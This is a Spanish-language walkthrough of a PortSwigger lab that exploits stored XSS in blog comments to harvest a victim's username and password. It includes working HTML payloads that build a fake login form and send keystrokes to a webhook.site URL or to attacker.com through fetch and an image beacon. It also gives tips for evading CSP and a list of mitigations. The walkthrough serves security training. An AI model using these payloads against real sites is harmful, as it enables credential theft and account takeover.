
---

# Explotar XSS para capturar contraseñas (credential harvesting)

Este documento explica cómo usar una vulnerabilidad de XSS almacenado para capturar credenciales de un usuario víctima mediante un formulario señuelo con exfiltración a un endpoint controlado por el atacante.

[Ver laboratorio PortSwigger](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

---

## Contexto del laboratorio

- **Tipo de vulnerabilidad**: XSS almacenado en la función de comentarios de un blog.
- **Comportamiento de la víctima**: un usuario simulado visualiza todos los comentarios tras ser publicados.
- **Objetivo**: exfiltrar el nombre de usuario y la contraseña de la víctima y usar esas credenciales para iniciar sesión en su cuenta.

La clave está en inyectar un comentario que, al renderizarse en el navegador de la víctima, muestre un mini formulario falso y capture lo que teclea.

---

## Idea del ataque

1. Publicamos un comentario que incluya un **formulario señuelo** con campos `username` y `password`.
2. Añadimos manejadores de evento (por ejemplo, `onchange` o `oninput`) que, cuando el usuario escriba, ejecuten `fetch(...)` para enviar los valores a un endpoint que controlamos (por ejemplo, un webhook).
3. Recuperamos los valores desde el endpoint y los usamos para iniciar sesión en la cuenta de la víctima.

---

## Payload que resuelve el laboratorio

> Nota: El siguiente payload usa `fetch` y `encodeURIComponent` para exfiltrar valores de forma robusta. También corregimos espaciado/atributos para compatibilidad con navegadores.

```html
Introduce tus credenciales para ver el post:<br><br>
Usuario:
<input name="username" id="username" oninput="fetch('https://webhook.site/3bdf0fcc-c5d6-4b07-a5c0-cfd0cf46afb4?username=' + encodeURIComponent(this.value))"><br><br>
Password:
<input name="password" id="password" type="password" oninput="fetch('https://webhook.site/3bdf0fcc-c5d6-4b07-a5c0-cfd0cf46afb4?password=' + encodeURIComponent(this.value))">
```

- Puedes usar `onchange` si prefieres exfiltrar sólo cuando el campo pierda el foco; `oninput` exfiltra en tiempo real mientras el usuario escribe.
- Sustituye la URL de `webhook.site/...` por tu endpoint (p. ej., un Burp Collaborator, RequestBin, etc.).

### Variante con `Image()` (útil cuando `fetch` no está disponible)

```html
<input name="username" oninput="(new Image).src='https://attacker.com/u?u='+encodeURIComponent(this.value)">
<input name="password" type="password" oninput="(new Image).src='https://attacker.com/p?p='+encodeURIComponent(this.value)">
```

---

## Paso a paso para resolver el lab

1. Abre la sección de comentarios del post objetivo.
2. En el campo de comentario, pega el payload HTML anterior y publica.
3. Espera a que el usuario simulado visualice la página (el laboratorio lo hace automáticamente al poco tiempo).
4. Abre tu endpoint (webhook/colaborador) y verifica la llegada de peticiones con parámetros `username` y `password`.
5. Copia las credenciales capturadas.
6. Ve a la página de login del laboratorio e inicia sesión con las credenciales exfiltradas.
7. Si el acceso es correcto, el laboratorio se marcará como resuelto.

---

## Por qué funciona

- El XSS almacenado se ejecuta en el navegador de la víctima al cargar el comentario.
- Los campos `input` son renderizados como parte del DOM y sus manejadores `oninput/onchange` ejecutan JavaScript en el **contexto de la víctima**.
- `fetch()` (o la técnica de la imagen) envía solicitudes HTTP salientes a tu servidor con los valores tecleados.

---

## Consideraciones y variaciones

- Si el lab sanitiza ciertos atributos inline, prueba `onchange` en lugar de `oninput`, o añade un pequeño `setTimeout` para evitar condiciones de carrera.
- Si `fetch` está bloqueado por CSP o políticas, usa el truco del **beacon por imagen** con `new Image().src = ...`.
- Puedes añadir UX engañosa (texto/estilos) para animar a la víctima a escribir sus datos.
- Usa `encodeURIComponent` para manejar caracteres especiales en los parámetros de la query.

---

## Mitigaciones (cómo debería corregirse)

1. **Escapar y sanitizar la salida**: nunca renderizar HTML controlado por el usuario como HTML; usar `textContent` o sanitizadores robustos.
2. **Deshabilitar inline event handlers**: mover la lógica a scripts externos y aplicar CSP estricta (`script-src` sin `unsafe-inline`).
3. **Validación server-side**: filtrar etiquetas/atributos peligrosos antes de almacenar comentarios.
4. **CSP**: además de bloquear inline JS, usar `form-action`, `connect-src` y `img-src` restrictivos para impedir exfiltración.
5. **Moderación/escaneo de contenidos**: revisar comentarios con reglas que detecten `<input>`, `on*=` y patrones de exfiltración.

---

## Ética y uso responsable

Este contenido es para fines educativos y de seguridad defensiva. No pruebes estas técnicas sin **permiso explícito**. Documenta los hallazgos y ayuda a remediarlos.

---
